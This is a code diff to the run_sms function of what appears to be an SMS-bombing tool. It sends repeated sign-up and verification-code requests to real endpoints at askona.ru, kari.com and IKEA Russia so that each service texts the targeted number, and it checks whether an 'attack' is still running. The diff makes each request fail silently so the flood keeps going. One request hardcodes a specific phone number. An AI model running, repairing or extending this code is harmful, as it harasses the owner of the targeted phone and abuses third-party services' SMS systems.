@@ -145,10 +145,13 @@ def run_sms(phone, userid):
             ('csrf_token', 'be9f0300383dec4f4bfb8ad196685f76'),
         )
 
-        response4 = requests.get('https://www.askona.ru/api/popup/register?phone=+79222633421&gulp=0&csrf_token=be9f0300383dec4f4bfb8ad196685f76', headers=headers)
+        try:
 
-        print(response4.status_code, "askona")
+            response4 = requests.get('https://www.askona.ru/api/popup/register?phone=+79222633421&gulp=0&csrf_token=be9f0300383dec4f4bfb8ad196685f76', headers=headers)
 
+            print(response4.status_code, "askona")
+        except:
+            pass
         time.sleep(2)
 
         headers = {
@@ -170,10 +173,12 @@ def run_sms(phone, userid):
         params = (
             ('phone', '+' + phone),
         )
+        try:
+            response5 = requests.get('https://i.api.kari.com/ecommerce/client/registration/verify/phone/code', headers=headers, params=params)
 
-        response5 = requests.get('https://i.api.kari.com/ecommerce/client/registration/verify/phone/code', headers=headers, params=params)
-
-        print(response5.status_code, 'kari')
+            print(response5.status_code, 'kari')
+        except:
+            pass
 
 
         time.sleep(2)
@@ -196,9 +201,11 @@ def run_sms(phone, userid):
         }
 
         data = '^{^\\^phoneNumber^\\^:^\\^+' + phone + '^\\^,^\\^flow^\\^:^\\^SIGNUP_PHONE_VERIFY^\\^^}'
-
-        response6 = requests.post('https://ru.accounts.ikea.com/cim/ru/ru/v1/passwordless/start', headers=headers, data=data)
-        print(response6.status_code, 'ikea')
+        try:
+            response6 = requests.post('https://ru.accounts.ikea.com/cim/ru/ru/v1/passwordless/start', headers=headers, data=data)
+            print(response6.status_code, 'ikea')
+        except:
+            pass
 
 
         if not utilities.is_attack_running(userid):
